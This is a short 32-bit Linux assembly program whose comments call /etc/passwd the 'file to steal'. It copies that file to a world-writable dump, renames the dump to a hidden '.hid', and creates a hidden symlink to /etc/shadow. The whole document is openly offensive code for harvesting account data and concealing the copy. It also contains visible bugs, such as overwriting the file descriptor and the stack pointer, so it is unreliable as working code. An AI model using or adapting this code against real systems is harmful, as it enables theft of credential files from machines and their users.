SECTION .data
    tgtfile: db "/etc/passwd",0 ;file to steal
    dmpfile: db "dump-file",0 ;file to dump contents to
    hidfile: db ".hid",0 ;file that will be used to hide the dumped file
    hidfile1: db ".hid1",0 ;file that will link shadow
    shadow: db "/etc/shadow",0 ;defining file to symlink
    success: db "File dumped to dump-file",0xA ;success message
    success_len: equ $-success ;len of success message

    bufsize dw 1024 ;the size of our buffer

;this is where we reserve our bytes
SECTION .bss
    buf resb 1024 ;if the bytes in the sent data is larger than that of the reserved bytes, bof incoming

SECTION .text ;declaring pointers
    global _start ;declaring our entry point

_start: ;instructions for entry point
    ;reading file
    mov eax, 5 ;sys_open
    mov ebx, tgtfile ;bytes of tgt file to the ebx register
    mov ecx, 0 ;readonly
    int 0x80 ;send instruction

    mov eax, 3 ;sys_read
    mov ebx, eax ;moving the bytes we allocated earlier to register eax
    mov ecx, buf ;moving our buffer to ecx register
    mov edx, bufsize ;allocating space to our buffer
    int 0x80 ;send instruction

    mov eax, 4 ;sys_write
    mov ebx, 1 ;standart out
    mov ecx, buf ;printing contents of buffer to stdout
    mov esp, buf ;moving contents of our buffer to the esp register for later use
    int 0x80 ;send instruction

    ;writing file
    mov eax, 8 ;sys_creat
    mov ebx, dmpfile ;moving bytes of dmpfile to ebx register
    mov ecx, 777 ;passing arguments for sys_creat permissions via ecx reg 
    int 0x80 ;passing kernel instructions

    mov ebx, eax ;moving value of eax to ebx
    mov eax, 4 ;sys_write
    mov ecx, esp ;moving value of esp (buf) to write args via ecx
    mov edx, 1024 ;length of string being written-size of our buffer
    int 0x80 ;passing kernel instructions

    mov eax, 6 ;sys_close
    int 0x80 ;passing kernel instructions

    mov eax,4 ;sys_write
    mov ebx, 1 ;stdout
    mov ecx, success ;passing bytes of success to write
    mov edx, success_len ;passing length of success to write
    int 0x80 ;passing kernel insructions

    mov eax, 38 ;sys_rename
    mov ebx, dmpfile ;bytes from dmp file into ebx
    mov ecx, hidfile ;bytes of hidfile into ecx
    int 0x80 ;passing kernel instructions

    mov eax, 83 ;sys_symlink
    mov ebx, shadow ;bytes of shadow into ebx
    mov ecx, hidfile1 ;bytes of hidfile1 into ecx
    int 0x80 ;passing kernel instructions

    mov eax,1 ;sys_exit
    int 0x80 ;send instruction, exit
